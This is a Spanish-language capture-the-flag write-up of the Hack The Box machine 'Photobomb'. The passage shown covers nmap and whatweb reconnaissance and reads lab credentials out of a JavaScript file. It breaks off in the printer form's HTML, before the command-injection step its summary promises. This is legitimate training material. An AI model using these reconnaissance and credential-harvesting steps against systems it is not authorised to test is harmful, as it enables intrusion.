<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Writeup Photobomb HTB" /><meta name="author" content="rabb1t" /><meta property="og:locale" content="es_ES" /><meta name="description" content="La máquina photobomb cuenta con un servicio web en el cual hay un panel de autenticación básico, en él podremos registrarnos gracias a unas credenciales que están en la propia web. Después de haber ingresado, tendremos que analizar las peticiones que se envían. Encontraremos una vulnerabilidad de CI (Command Injection) porque no se está sanitizando bien las entradas; con lo cual, podremos acceder al usuario sin privilegios del sistema. En la escalada de privilegios tendremos un archivo que podemos ejecutar con permisos de superusuario, y haciendo un secuestro de un binario, nos convertiremos en el usuario root." /><meta property="og:description" content="La máquina photobomb cuenta con un servicio web en el cual hay un panel de autenticación básico, en él podremos registrarnos gracias a unas credenciales que están en la propia web. Después de haber ingresado, tendremos que analizar las peticiones que se envían. Encontraremos una vulnerabilidad de CI (Command Injection) porque no se está sanitizando bien las entradas; con lo cual, podremos acceder al usuario sin privilegios del sistema. En la escalada de privilegios tendremos un archivo que podemos ejecutar con permisos de superusuario, y haciendo un secuestro de un binario, nos convertiremos en el usuario root." /><link rel="canonical" href="https://rabb1t-0.github.io/posts/WriteUp-Photobomb-HTB/" /><meta property="og:url" content="https://rabb1t-0.github.io/posts/WriteUp-Photobomb-HTB/" /><meta property="og:site_name" content="rabb1t" /><meta property="og:image" content="https://www.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png" /><meta property="og:image:height" content="180" /><meta property="og:image:width" content="180" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-02-11T00:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://www.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png" /><meta property="twitter:title" content="Writeup Photobomb HTB" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"rabb1t"},"dateModified":"2024-08-03T17:28:44-05:00","datePublished":"2023-02-11T00:00:00-05:00","description":"La máquina photobomb cuenta con un servicio web en el cual hay un panel de autenticación básico, en él podremos registrarnos gracias a unas credenciales que están en la propia web. Después de haber ingresado, tendremos que analizar las peticiones que se envían. Encontraremos una vulnerabilidad de CI (Command Injection) porque no se está sanitizando bien las entradas; con lo cual, podremos acceder al usuario sin privilegios del sistema. En la escalada de privilegios tendremos un archivo que podemos ejecutar con permisos de superusuario, y haciendo un secuestro de un binario, nos convertiremos en el usuario root.","headline":"Writeup Photobomb HTB","image":{"width":180,"height":180,"url":"https://www.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rabb1t-0.github.io/posts/WriteUp-Photobomb-HTB/"},"url":"https://rabb1t-0.github.io/posts/WriteUp-Photobomb-HTB/"}</script><title>Writeup Photobomb HTB | rabb1t</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/rbit.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/rbit.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/rbit.jpg"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/favicon/rbit.ico"><meta name="apple-mobile-web-app-title" content="rabb1t"><meta name="application-name" content="rabb1t"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto glitch"><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div></a></div><div class="site-title mt-3"> <a href="/">rabb1t</a></div><div class="site-subtitle font-italic">Blog personal, CTFS, artículos de ciberseguridad y más.</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog" class="nav-link cybr-btn"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> INICIO <span class='cybr-btn__glitch' aria-hidden=''>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> CATEGORÍAS <span aria-hidden class="cybr-btn__glitch">CATEGORÍAS </span> </a><li class="nav-item"> <a href="/tags/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> ETIQUETAS <span aria-hidden class="cybr-btn__glitch">ETIQUETAS </span> </a><li class="nav-item"> <a href="/archives/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> ARCHIVO <span aria-hidden class="cybr-btn__glitch">ARCHIVO </span> </a><li class="nav-item"> <a href="/about/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> ACERCA DE <span aria-hidden class="cybr-btn__glitch">ACERCA DE </span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/rabb1t-0 " aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/rabb1t" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog"> Inicio </a> </span> <span>Writeup Photobomb HTB</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'%3E%3C/svg%3E" data-src="https://www.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png" class="preview-img bg" alt="Preview Image" width="180" height="180" data-proofer-ignore><h1 data-toc-skip>Writeup Photobomb HTB</h1><div class="post-meta text-muted"><div> Por <em> rabb1t </em></div><div class="d-flex"><div> <span> Publicado <em class="timeago" data-ts="1676091600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-02-11 </em> </span> <span> Actualizado <em class="timeago" data-ts="1722724124" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-08-03 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2292 palabras"> <em>12 min</em> de lectura</span></div></div></div><div class="post-content"><p>La máquina photobomb cuenta con un servicio web en el cual hay un panel de autenticación básico, en él podremos registrarnos gracias a unas credenciales que están en la propia web. Después de haber ingresado, tendremos que analizar las peticiones que se envían. Encontraremos una vulnerabilidad de CI (Command Injection) porque no se está sanitizando bien las entradas; con lo cual, podremos acceder al usuario sin privilegios del sistema. En la escalada de privilegios tendremos un archivo que podemos ejecutar con permisos de superusuario, y haciendo un secuestro de un binario, nos convertiremos en el usuario root.</p><h2 id="índice"><span class="mr-2">Índice</span><a href="#índice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="#máquina-photobomb">Información básica de la máquina</a><li><a href="#herramientas-y-recursos-empleados">Herramientas y recursos empleados</a><li><a href="#enumeración">Enumeración</a><li><a href="#ejecutando-comandos-command-injection">Ejecutando comandos (Command Injection)</a><ul><li><a href="#obteniendo-una-shell-como-wizard">Obteniendo una shell como wizard</a><li><a href="#analizando-código-ruby-de-servicio-web">Analizando código ruby de servicio web</a></ul><li><a href="#escalando-privilegios">Escalando privilegios</a><ul><li><a href="#analizando-código-y-secuestro-del-path">Analizando código y secuestro del path</a><li><h2 id="máquina-photobomb"><span class="mr-2">Máquina Photobomb</span><a href="#máquina-photobomb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></ul></ul><div class="table-wrapper"><table><thead><tr><th>IP<th>10.10.11.182<tbody><tr><td>OS<td>Linux<tr><td>Dificultad<td>Fácil<tr><td>Creador<td>Nauten</table></div><h2 id="herramientas-y-recursos-empleados"><span class="mr-2">Herramientas y recursos empleados</span><a href="#herramientas-y-recursos-empleados" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Herramientas<ul><li>nmap<li>whatweb<li>BurpSuite<li>TShark</ul></ul><hr /><h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Comenzamos realizando un escaneo con nmap a la máquina víctima:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="c"># nmap -sCV -Pn -n -oN scope.txt 10.10.11.182</span>
Nmap scan report <span class="k">for </span>10.10.11.182
Host is up <span class="o">(</span>0.094s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d <span class="o">(</span>RSA<span class="o">)</span>
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
</pre></table></code></div></div><p>Como no contamos con credenciales para conectarnos por SSH (puerto 22), vamos a enumerar el servicio que corre por el puerto 80 (HTTP). Vemos que hay un redireccionamiento al dominio <em>photobomb</em> así que agregamos este subdominio con la extensión (.htb) al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> con su respectiva IP.</p><p>Ahora usamos la herramienta <strong>whatweb</strong> para tener un poco más de información de la web:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ whatweb http://photobomb.htb
<span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux] nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>, IP[10.10.11.182], Script Title[Photobomb],UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block], nginx[1.18.0]
</pre></table></code></div></div><p>No hay nada relevante además de saber que el servidor es <strong>nginx</strong> ejecutándose en un sistema operativo Ubuntu. Veamos qué nos encontramos en la página:</p><p><img data-src="/assets/favicon/2023-02-11/photobomb1.png" alt="Web photobomb" data-proofer-ignore></p><p>“click here!” nos lleva a un <a href="http://photobomb.htb/printer">panel</a> convencional de inicio de sesión: <img data-src="/assets/favicon/2023-02-11/photobomb2.png" alt="Web photobomb" data-proofer-ignore></p><p>Antes de aplicar fuerza bruta a las rutas o subdominios, revisemos el código fuente:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;title&gt;</span>Photobomb<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;link</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"styles.css"</span> <span class="na">media=</span><span class="s">"all"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"photobomb.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"container"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;header&gt;</span>
      <span class="nt">&lt;h1&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Photobomb<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
    <span class="nt">&lt;/header&gt;</span>
    <span class="nt">&lt;article&gt;</span>
      <span class="nt">&lt;h2&gt;</span>Welcome to your new Photobomb franchise!<span class="nt">&lt;/h2&gt;</span>
      <span class="nt">&lt;p&gt;</span>You will soon be making an amazing income selling premium photographic gifts.<span class="nt">&lt;/p&gt;</span>
      <span class="nt">&lt;p&gt;</span>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.<span class="nt">&lt;/p&gt;</span>
      <span class="nt">&lt;p&gt;</span>To get started, please <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/printer"</span> <span class="na">class=</span><span class="s">"creds"</span><span class="nt">&gt;</span>click here!<span class="nt">&lt;/a&gt;</span> (the credentials are in your welcome pack).<span class="nt">&lt;/p&gt;</span>
      <span class="nt">&lt;p&gt;</span>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.<span class="nt">&lt;/p&gt;</span>
    <span class="nt">&lt;/article&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>Vemos un archivo javascript llamado “photobomb.js”. Veamos qué contiene:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">init</span><span class="p">()</span> <span class="p">{</span>
  <span class="c1">// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/^</span><span class="se">(</span><span class="sr">.*;</span><span class="se">)?\s</span><span class="sr">*isPhotoBombTechSupport</span><span class="se">\s</span><span class="sr">*=</span><span class="se">\s</span><span class="sr">*</span><span class="se">[^</span><span class="sr">;</span><span class="se">]</span><span class="sr">+</span><span class="se">(</span><span class="sr">.*</span><span class="se">)?</span><span class="sr">$/</span><span class="p">))</span> <span class="p">{</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="dl">'</span><span class="s1">creds</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">href</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://pH0t0:b0Mb!@photobomb.htb/printer</span><span class="dl">'</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">init</span><span class="p">;</span>
</pre></table></code></div></div><p>Hay una función la cual “pre-propula” las credenciales para el soporte técnico en la página. La función busca una cookie llamada “isPhotoBombTechSupport” y si existe, establece un atributo “href” al elemento con clase “creds” con la URL. La función se ejecuta cuando la página haya terminado de cargar. Y bueno, tiene credenciales, así que probamos en el panel de autenticación básico y vemos lo siguiente: <img data-src="/assets/favicon/2023-02-11/photobomb3.png" alt="Web photobomb" data-proofer-ignore></p><p>Si probamos las credenciales por SSH no tenemos acceso, no sería tan fácil después de todo :/</p><p>Como no sabemos el tipo de tecnología que se está empleando, podemos aprovecharnos de los errores que el servidor retorne. En este caso he apuntado al archivo “index.php” (muy común en aplicativos PHP), y aparece el siguiente error:</p><p><img data-src="/assets/favicon/2023-02-11/photobomb4.png" alt="Web photobomb" data-proofer-ignore> Con esto podemos deducir que se está empleando ruby para el aplicativo web.</p><p>Revisando el código fuente en esta ruta de la web, vemos que se hace una petición por POST:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;title&gt;</span>Photobomb<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;link</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"styles.css"</span> <span class="na">media=</span><span class="s">"all"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"container"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;header&gt;</span>
      <span class="nt">&lt;h1&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Photobomb<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
    <span class="nt">&lt;/header&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"photo-form"</span> <span class="na">action=</span><span class="s">"/printer"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h3&gt;</span>Select an image<span class="nt">&lt;/h3&gt;</span>
      <span class="nt">&lt;fieldset</span> <span class="na">id=</span><span class="s">"image-wrapper"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"photo"</span> <span class="na">value=</span><span class="s">"voicu-apostol-MWER49YaD-M-unsplash.jpg"</span> <span class="na">id=</span><span class="s">"voicu-apostol-MWER49YaD-M-unsplash.jpg"</span> <span class="na">checked=</span><span class="s">"checked"</span> <span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"voicu-apostol-MWER49YaD-M-unsplash.jpg"</span> <span class="na">style=</span><span class="s">"background-image: url(ui_images/voicu-apostol-MWER49YaD-M-unsplash.jpg)"</span><span class="nt">&gt;&lt;/label&gt;&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"photo"</span> <span class="na">value=</span><span class="s">"masaaki-komori-NYFaNoiPf7A-unsplash.jpg"</span> <span class="na">id=</span><span class="s">"masaaki-komori-NYFaNoiPf7A-unsplash.jpg"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"masaaki-komori-NYFaNoiPf7A-unsplash.jpg"</span> <span class="na">style=</span><span class="s">"background-image: url(ui_images/masaaki-komori-NYFaNoiPf7A-unsplash.jpg)"</span><span class="nt">&gt;&lt;/label&gt;&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"photo"</span> <span class="na">value=</span><span class="s">"andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg"</span> <span class="na">id=</span><span class="s">"andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg"</span> <span class="na">style=</span><span class="s">"background-image: url(ui_images/andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg)"</span><span class="nt">&gt;&lt;/label&gt;&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"photo"</span> <span class="na">value=</span><span class="s">"tabitha-turner-8hg0xRg5QIs-unsplash.jpg"</span> <span class="na">id=</span><span class="s">"tabitha-turner-8hg0xRg5QIs-unsplash.jpg"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"tabitha-turner-8hg0xRg5QIs-unsplash.jpg"</span> <span class="na">style=</span><span class="s">"background-image: url(ui_images/tabitha-turner-8hg0xRg5QIs-unsplash.jpg)"</span><span class="nt">&gt;&lt;/label&gt;&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"photo"</span> <span class="na">value=</span><span class="s">"nathaniel-worrell-zK_az6W3xIo-unsplash.jpg"</span> <span class="na">id=</span><span class="s">"nathaniel-worrell-zK_az6W3xIo-unsplash.jpg"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"nathaniel-worrell-zK_az6W3xIo-unsplash.jpg"</span> <span class="na">style=</span><span class="s">"background-image: url(ui_images/nathaniel-worrell-zK_az6W3xIo-unsplash.jpg)"</span><span class="nt">&gt;&lt;/label&gt;&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"photo"</span> <span class="na">value=</span><span class="s">"kevin-charit-XZoaTJTnB9U-unsplash.jpg"</span> <span class="na">id=</span><span class="s">"kevin-charit-XZoaTJTnB9U-unsplash.jpg"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"kevin-charit-XZoaTJTnB9U-unsplash.jpg"</span> <span class="na">style=</span><span class="s">"background-image: url(ui_images/kevin-charit-XZoaTJTnB9U-unsplash.jpg)"</span><span class="nt">&gt;&lt;/label&gt;&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"photo"</span> <span class="na">value=</span><span class="s">"calvin-craig-T3M72YMf2oc-unsplash.jpg"</span> <span class="na">id=</span><span class="s">"calvin-craig-T3M72YMf2oc-unsplash.jpg"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"calvin-craig-T3M72YMf2oc-unsplash.jpg"</span> <span class="na">style=</span><span class="s">"background-image: url(ui_images/calvin-craig-T3M72YMf2oc-unsplash.jpg)"</span><span class="nt">&gt;&lt;/label&gt;&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"photo"</span> <span class="na">value=</span><span class="s">"eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg"</span> <span class="na">id=</span><span class="s">"eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg"</span> <span class="na">style=</span><span class="s">"background-image: url(ui_images/eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg)"</span><span class="nt">&gt;&lt;/label&gt;&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"photo"</span> <span class="na">value=</span><span class="s">"finn-whelen-DTfhsDIWNSg-unsplash.jpg"</span> <span class="na">id=</span><span class="s">"finn-whelen-DTfhsDIWNSg-unsplash.jpg"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"finn-whelen-DTfhsDIWNSg-unsplash.jpg"</span> <span class="na">style=</span><span class="s">"background-image: url(ui_images/finn-whelen-DTfhsDIWNSg-unsplash.jpg)"</span><span class="nt">&gt;&lt;/label&gt;&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"photo"</span> <span class="na">value=</span><span class="s">"almas-salakhov-VK7TCqcZTlw-unsplash.jpg"</span> <span class="na">id=</span><span class="s">"almas-salakhov-VK7TCqcZTlw-unsplash.jpg"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"almas-salakhov-VK7TCqcZTlw-unsplash.jpg"</span> <span class="na">style=</span><span class="s">"background-image: url(ui_images/almas-salakhov-VK7TCqcZTlw-unsplash.jpg)"</span><span class="nt">&gt;&lt;/label&gt;&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"photo"</span> <span class="na">value=</span><span class="s">"mark-mc-neill-4xWHIpY2QcY-unsplash.jpg"</span> <span class="na">id=</span><span class="s">"mark-mc-neill-4xWHIpY2QcY-unsplash.jpg"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span 